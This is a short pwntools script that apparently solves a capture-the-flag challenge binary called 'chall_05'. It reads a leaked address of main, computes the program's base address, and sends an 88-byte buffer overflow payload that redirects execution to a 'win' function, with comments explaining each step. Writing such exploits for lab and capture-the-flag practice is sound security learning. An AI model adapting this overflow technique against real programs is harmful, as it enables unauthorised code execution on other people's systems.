from pwn import *
# Create a process object for the executable "chall_05"
p = process("./chall_05")
# Receive data from the process until a colon character (":") is encountered and store it in the variable "leak"
p.recvuntil(":")
leak = p.recv()
# Convert the leaked address from hexadecimal to an integer
intleak = int(leak, 16)
# Load the ELF binary into the "elf" object for analysis
elf = ELF("./chall_05")
# Calculate the base address of the ELF binary by subtracting the address of the "main" symbol from the leaked address
elf.address = intleak - elf.sym.main
# Convert the base address of the ELF binary to hexadecimal for display purposes
hex(elf.address)
# Craft the payload: 88 bytes of 'a' characters followed by the little-endian representation of the address of the "win" symbol in the binary
payload = b'a' * 88 + p64(elf.sym.win)
p.sendline(payload)
p.interactive()

